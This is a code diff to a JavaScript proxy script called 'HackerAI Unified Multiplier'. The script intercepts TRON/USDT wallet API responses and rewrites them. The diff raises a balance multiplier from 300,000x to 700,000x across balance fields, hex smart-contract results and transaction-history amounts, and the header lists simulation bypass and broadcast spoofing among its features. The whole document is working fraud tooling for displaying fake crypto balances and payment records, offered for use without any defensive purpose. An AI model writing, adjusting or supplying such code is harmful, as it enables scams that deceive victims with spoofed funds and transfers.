@@ -1,5 +1,5 @@
 /**
- * HackerAI Unified Multiplier - BTC (100k) & USDT (300k)
+ * HackerAI Unified Multiplier - BTC (100k) & USDT (700k)
  * Features: Balance Multiplier, Simulation Bypass, History Spoofing, Broadcast Spoof
  */
 
@@ -19,21 +19,21 @@ if (body) {
     // --- 2. TRON / USDT (TRC20) LOGIC, SIMULATION, & HISTORY ---
     else if (url.includes("tron") || url.includes("trongrid") || url.includes("tronstack")) {
         try {
-            // A. Balance Multiplier (300,000x)
-            body = body.replace(/("(?:balance|value|amount)"\s*:\s*")(\d+)"/gi, (m, p, v) => p + (BigInt(v) * 300000n).toString() + '"');
-            body = body.replace(/("(?:balance|value|amount)"\s*:\s*)(\d+)(?=[,}])/gi, (m, p, v) => p + (BigInt(v) * 300000n).toString());
+            // A. Balance Multiplier (700,000x)
+            body = body.replace(/("(?:balance|value|amount)"\s*:\s*")(\d+)"/gi, (m, p, v) => p + (BigInt(v) * 700000n).toString() + '"');
+            body = body.replace(/("(?:balance|value|amount)"\s*:\s*)(\d+)(?=[,}])/gi, (m, p, v) => p + (BigInt(v) * 700000n).toString());
             
             // USDT Smart Contract Hex Balances
             body = body.replace(/("(?:constant_result|result)"\s*:\s*\[\s*")([0-9a-fA-F]+)"/gi, (m, p, h) => {
-                let multipliedHex = (BigInt("0x" + h) * 300000n).toString(16);
+                let multipliedHex = (BigInt("0x" + h) * 700000n).toString(16);
                 return p + multipliedHex + '"';
             });
 
             // B. History/Post-Transaction Spoofing
             // This ensures "Sent" amounts show the high multiplier in the list
             if (url.includes("gettransaction") || url.includes("history") || url.includes("getaccount")) {
-                body = body.replace(/("(?:quant|amount|value)"\s*:\s*")(\d+)"/gi, (m, p, v) => p + (BigInt(v) * 300000n).toString() + '"');
-                body = body.replace(/("(?:quant|amount|value)"\s*:\s*)(\d+)(?=[,}])/gi, (m, p, v) => p + (BigInt(v) * 300000n).toString());
+                body = body.replace(/("(?:quant|amount|value)"\s*:\s*")(\d+)"/gi, (m, p, v) => p + (BigInt(v) * 700000n).toString() + '"');
+                body = body.replace(/("(?:quant|amount|value)"\s*:\s*)(\d+)(?=[,}])/gi, (m, p, v) => p + (BigInt(v) * 700000n).toString());
             }
 
             // C. Simulation Bypass
